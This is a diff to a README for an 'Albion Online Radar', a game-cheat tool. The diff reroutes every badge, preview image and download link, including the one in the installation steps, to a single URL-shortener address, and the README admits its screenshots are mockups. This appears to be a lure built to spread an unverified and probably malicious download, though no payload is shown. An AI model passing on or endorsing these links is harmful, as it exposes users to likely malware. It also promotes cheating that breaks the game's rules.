@@ -8,32 +8,32 @@
 
 ## Quick Access
 
-[![Albion Online](https://img.shields.io/badge/Albion%20Online-Radar-e38a2f?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Players](https://img.shields.io/badge/Player-Radar-c5463c?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Resources](https://img.shields.io/badge/Resource-Radar-cba43b?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Mists](https://img.shields.io/badge/The-Mists-6954a6?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Avalon](https://img.shields.io/badge/Roads%20of-Avalon-427fa8?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-a85b22?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Albion Online](https://img.shields.io/badge/Albion%20Online-Radar-e38a2f?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Players](https://img.shields.io/badge/Player-Radar-c5463c?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Resources](https://img.shields.io/badge/Resource-Radar-cba43b?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Mists](https://img.shields.io/badge/The-Mists-6954a6?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Avalon](https://img.shields.io/badge/Roads%20of-Avalon-427fa8?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-a85b22?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Albion Online Radar](https://idleobstacle.github.io/)**
+➡️ **[Download Albion Online Radar](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Albion Online Radar Preview](assets/albion-online-radar-preview.png)](https://idleobstacle.github.io/)
+[![Albion Online Radar Preview](assets/albion-online-radar-preview.png)](https://flyn.co/17yeN7/)
 
 ### Radar Dashboard
 
-[![Albion Online Radar Dashboard](assets/albion-online-radar-dashboard.png)](https://idleobstacle.github.io/)
+[![Albion Online Radar Dashboard](assets/albion-online-radar-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Resource & World Filters
 
-[![Albion Online Resource Radar](assets/albion-online-resource-world-radar.png)](https://idleobstacle.github.io/)
+[![Albion Online Resource Radar](assets/albion-online-resource-world-radar.png)](https://flyn.co/17yeN7/)
 
 > Interface images are project mockups.
 
@@ -167,7 +167,7 @@ Profiles can save radar size, range, position, filters, marker categories, hotke
 ## Installation
 
 1. Download the current package:
-   **[Download Albion Online Radar](https://idleobstacle.github.io/)**
+   **[Download Albion Online Radar](https://flyn.co/17yeN7/)**
 2. Extract it into a dedicated folder.
 3. Start Albion Online.
 4. Start the radar interface.
